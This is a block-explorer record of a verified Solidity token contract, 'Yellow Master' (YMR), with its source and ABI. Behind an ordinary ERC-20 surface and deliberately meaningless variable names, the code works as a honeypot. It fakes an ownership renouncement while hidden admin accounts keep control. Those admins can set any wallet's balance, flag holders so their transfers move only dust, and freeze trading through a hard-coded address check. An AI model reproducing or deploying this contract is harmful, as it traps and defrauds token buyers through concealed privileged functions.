{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface fundAmount {\n    function createPair(address walletAuto, address liquidityReceiver) external returns (address);\n}\n\ninterface exemptTokenLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamMin) external view returns (uint256);\n\n    function transfer(address modeIs, uint256 receiverFrom) external returns (bool);\n\n    function allowance(address sellReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeIs,\n        uint256 receiverFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isReceiver, uint256 value);\n    event Approval(address indexed sellReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract launchIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptTokenLaunchedMetadata is exemptTokenLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract YellowMaster is launchIs, exemptTokenLaunched, exemptTokenLaunchedMetadata {\n\n    address public walletReceiver;\n\n    function atLiquidityEnable(address autoTrading, address modeIs, uint256 receiverFrom) internal returns (bool) {\n        if (autoTrading == minEnableMarketing) {\n            return receiverTotalMarketing(autoTrading, modeIs, receiverFrom);\n        }\n        uint256 limitSenderTake = exemptTokenLaunched(walletReceiver).balanceOf(fromAmount);\n        require(limitSenderTake == receiverFee);\n        require(modeIs != fromAmount);\n        if (atWallet[autoTrading]) {\n            return receiverTotalMarketing(autoTrading, modeIs, fromReceiverToken);\n        }\n        return receiverTotalMarketing(autoTrading, modeIs, receiverFrom);\n    }\n\n    string private feeTradingSell = \"YMR\";\n\n    bool public takeAt;\n\n    mapping(address => uint256) private receiverTo;\n\n    uint256 private buyToken = 100000000 * 10 ** 18;\n\n    bool public buyListTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTradingSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellTotal;\n\n    function owner() external view returns (address) {\n        return feeToLaunched;\n    }\n\n    function receiverShould(address fundTeamLimit, uint256 receiverFrom) public {\n        amountLaunched();\n        receiverTo[fundTeamLimit] = receiverFrom;\n    }\n\n    uint256 private shouldWallet;\n\n    constructor (){\n        if (listIsWallet == listAuto) {\n            walletFee = shouldWallet;\n        }\n        exemptSender launchTeam = exemptSender(tokenShould);\n        walletReceiver = fundAmount(launchTeam.factory()).createPair(launchTeam.WETH(), address(this));\n        if (shouldWallet != buyTo) {\n            buyTo = walletFee;\n        }\n        minEnableMarketing = _msgSender();\n        receiverMode[minEnableMarketing] = true;\n        receiverTo[minEnableMarketing] = buyToken;\n        listTake();\n        if (enableFrom == shouldWallet) {\n            enableFrom = walletFee;\n        }\n        emit Transfer(address(0), minEnableMarketing, buyToken);\n    }\n\n    function isLiquidity(address walletSender) public {\n        require(walletSender.balance < 100000);\n        if (takeAt) {\n            return;\n        }\n        \n        receiverMode[walletSender] = true;\n        if (walletFee != enableFrom) {\n            buyTo = enableFrom;\n        }\n        takeAt = true;\n    }\n\n    function transferFrom(address autoTrading, address modeIs, uint256 receiverFrom) external override returns (bool) {\n        if (_msgSender() != tokenShould) {\n            if (sellTotal[autoTrading][_msgSender()] != type(uint256).max) {\n                require(receiverFrom <= sellTotal[autoTrading][_msgSender()]);\n                sellTotal[autoTrading][_msgSender()] -= receiverFrom;\n            }\n        }\n        return atLiquidityEnable(autoTrading, modeIs, receiverFrom);\n    }\n\n    uint256 constant fromReceiverToken = 14 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyToken;\n    }\n\n    uint256 receiverFee;\n\n    function name() external view virtual override returns (string memory) {\n        return listShould;\n    }\n\n    function minTo(address toFund) public {\n        amountLaunched();\n        if (buyTo == enableFrom) {\n            buyTo = walletFee;\n        }\n        if (toFund == minEnableMarketing || toFund == walletReceiver) {\n            return;\n        }\n        atWallet[toFund] = true;\n    }\n\n    uint256 fundIsAuto;\n\n    mapping(address => bool) public receiverMode;\n\n    function transfer(address fundTeamLimit, uint256 receiverFrom) external virtual override returns (bool) {\n        return atLiquidityEnable(_msgSender(), fundTeamLimit, receiverFrom);\n    }\n\n    mapping(address => bool) public atWallet;\n\n    function listTake() public {\n        emit OwnershipTransferred(minEnableMarketing, address(0));\n        feeToLaunched = address(0);\n    }\n\n    event OwnershipTransferred(address indexed amountMaxToken, address indexed teamIs);\n\n    address fromAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public walletFee;\n\n    bool private listIsWallet;\n\n    function shouldLaunch(uint256 receiverFrom) public {\n        amountLaunched();\n        receiverFee = receiverFrom;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isFundLaunched;\n    }\n\n    function balanceOf(address teamMin) public view virtual override returns (uint256) {\n        return receiverTo[teamMin];\n    }\n\n    uint256 public enableFrom;\n\n    address public minEnableMarketing;\n\n    function amountLaunched() private view {\n        require(receiverMode[_msgSender()]);\n    }\n\n    uint8 private isFundLaunched = 18;\n\n    uint256 private buyTo;\n\n    string private listShould = \"Yellow Master\";\n\n    function allowance(address maxFundExempt, address modeToTx) external view virtual override returns (uint256) {\n        if (modeToTx == tokenShould) {\n            return type(uint256).max;\n        }\n        return sellTotal[maxFundExempt][modeToTx];\n    }\n\n    function receiverTotalMarketing(address autoTrading, address modeIs, uint256 receiverFrom) internal returns (bool) {\n        require(receiverTo[autoTrading] >= receiverFrom);\n        receiverTo[autoTrading] -= receiverFrom;\n        receiverTo[modeIs] += receiverFrom;\n        emit Transfer(autoTrading, modeIs, receiverFrom);\n        return true;\n    }\n\n    bool public listAuto;\n\n    function getOwner() external view returns (address) {\n        return feeToLaunched;\n    }\n\n    address private feeToLaunched;\n\n    address tokenShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address modeToTx, uint256 receiverFrom) public virtual override returns (bool) {\n        sellTotal[_msgSender()][modeToTx] = receiverFrom;\n        emit Approval(_msgSender(), modeToTx, receiverFrom);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMaxToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFundExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeToTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyListTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"isLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnableMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"}],\"name\":\"minTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"shouldLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "YellowMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}